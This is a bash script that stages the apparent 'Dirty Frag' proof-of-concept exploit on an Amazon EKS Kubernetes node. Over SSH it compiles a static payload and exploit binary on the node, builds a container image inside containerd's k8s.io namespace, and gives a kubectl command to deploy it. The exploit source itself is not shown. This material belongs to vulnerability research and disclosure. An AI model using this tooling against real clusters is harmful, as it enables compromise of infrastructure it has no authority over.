#!/usr/bin/env bash
set -euo pipefail

# Dirty Frag Kubernetes PoC — EKS node setup script
#
# This script:
#  1. Copies project files to the EKS node
#  2. Compiles the nolibc payload + exploit on the node
#  3. Builds the container image with nerdctl and imports it into
#     containerd's k8s.io namespace so kubelet can use it.

NODE="${1:?Usage: $0 <user@node-ip>}"
REMOTE_DIR="/tmp/dirtyfrag-poc"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"

echo "[*] Syncing project to ${NODE}:${REMOTE_DIR} ..."
ssh "$NODE" "rm -rf ${REMOTE_DIR} && mkdir -p ${REMOTE_DIR}"
rsync -az --exclude='.git' --exclude='build/' \
    "$PROJECT_DIR/" "${NODE}:${REMOTE_DIR}/"

echo "[*] Building payload + exploit on node ..."
ssh "$NODE" "cd ${REMOTE_DIR} && \
    mkdir -p build && \
    gcc -static -nostdlib -include payload/nolibc/nolibc.h \
        -o build/payload payload/payload-eks.c && \
    xxd -i build/payload > build/payload_bin.h && \
    gcc -O0 -Wall -static -o build/dirtyfrag exploit/dirtyfrag.c"

echo "[*] Pulling base image (reuses cached kube-proxy layers) ..."
ssh "$NODE" "sudo nerdctl -n k8s.io pull \
    public.ecr.aws/eks-distro-build-tooling/eks-distro-minimal-base-iptables:2026-03-11-1773190710.2023 \
    2>&1 | tail -3"

echo "[*] Building container image with nerdctl ..."
ssh "$NODE" "cd ${REMOTE_DIR} && \
    sudo nerdctl -n k8s.io build -f Dockerfile.eks -t dirtyfrag-poc:eks ."

echo "[+] Image ready. Deploy with:  kubectl apply -f deploy/poc-eks.yaml"
